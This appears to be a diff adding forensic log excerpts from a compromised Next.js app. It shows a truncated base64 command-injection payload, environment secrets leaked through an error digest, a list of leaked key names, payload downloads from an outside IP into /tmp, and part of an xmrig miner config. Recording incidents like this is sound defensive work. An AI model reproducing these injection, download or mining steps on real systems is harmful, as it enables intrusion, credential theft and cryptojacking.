@@ -1,0 +1,95 @@
+=== 1. nginx 504 ===
+study-mate-nginx  | 2026/07/06 05:05:33 [error] 30#30: *26474 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 220.87.128.5, server: w-neocode.com, request: "GET / HTTP/1.0", upstream: "http://<container-ip>:3000/", host: "<EC2-IP>"
+study-mate-nginx  | 2026/07/06 05:35:39 [error] 30#30: *26517 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 175.207.216.135, server: w-neocode.com, request: "GET / HTTP/1.0", upstream: "http://<container-ip>:3000/", host: "<EC2-IP>"
+study-mate-nginx  | 2026/07/06 06:32:27 [error] 29#29: *26541 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 218.148.96.14, server: w-neocode.com, request: "GET / HTTP/1.0", upstream: "http://<container-ip>:3000/", host: "<EC2-IP>"
+
+=== 2. env leak (truncated) ===
+study-mate-app  |   digest: 'TkVYVF9QVUJMSUNfU1RPUkFHRV9CVUNLRVRfUFJPRklMRT1wcm9maWxlLWltYWdlcwpOT0RFX1ZFUlNJT049MjAuMjAuMgpIT1NUTkFNRT0wLjAuMC4wCllBUk5fVkVSU0l
+study-mate-app  | }
+study-mate-app  | /bin/sh: bash: not found
+study-mate-app  |  ⨯ Error: Command failed: echo "IyEvYmluL2Jhc2gKcD0oInN5c2xvZ2QtWzAtOWEtZl0iICJub2RlLiopXGIkIiAiUHJvY2Vzc0NvbnRhIiAidWNodHRwZCIgIm5leHQtc2Vy
+--
+
+=== 2b. leaked keys (names only) ===
+NEXT_PUBLIC_STORAGE_BUCKET_PROFILE
+NODE_VERSION
+HOSTNAME
+YARN_VERSION
+SHLVL
+PORT
+HOME
+VIPSHOME
+OPENAI_API_KEY
+NEXT_DEPLOYMENT_ID
+__NEXT_PRIVATE_ORIGIN
+NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY
+NEXT_PUBLIC_SUPABASE_URL
+__NEXT_PRIVATE_STANDALONE_CONFIG
+PATH
+NEXT_TELEMETRY_DISABLED
+SUPABASE_SECRET_KEY
+NEXT_PUBLIC_STORAGE_BUCKET_POST
+PWD
+NODE_ENV
+
+=== 3. payload download ===
+study-mate-app  | }
+study-mate-app  | Connecting to 77.90.13.20 (77.90.13.20:80)
+study-mate-app  | saving to '/tmp/dashboard'
+study-mate-app  | dashboard              1% |                                | 95568  0:01:26 ETA
+study-mate-app  | dashboard             12% |***                             | 1002k  0:00:14 ETA
+study-mate-app  | dashboard             63% |********************            | 5209k  0:00:01 ETA
+study-mate-app  | dashboard            100% |********************************| 8155k  0:00:00 ETA
+--
+study-mate-app  | }
+study-mate-app  | Connecting to 77.90.13.20 (77.90.13.20:80)
+study-mate-app  | saving to '/tmp/v.json'
+study-mate-app  | v.json               100% |********************************|  2127  0:00:00 ETA
+study-mate-app  | '/tmp/v.json' saved
+study-mate-app  |  ⨯ Error: x
+study-mate-app  |     at ignore-listed frames {
+
+=== 4. xmrig config ===
+{
+    "api": {
+        "id": null,
+        "worker-id": "nnjjss2"
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": true,
+    "colors": false,
+    "title": false,
+    "randomx": {
+        "init": -1,
+        "init-avx2": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": true,
+        "hw-aes": null,
+        "priority": 5,
+        "memory-pool": false,
+        "yield": false,
+        "asm": true,
+        "argon2-impl": "x86_64",
+        "argon2": [0, 1],
+        "cn": [
+            [1, 0]
+
+=== 5. processes ===
+    1 nextjs    0:02 next-server (v
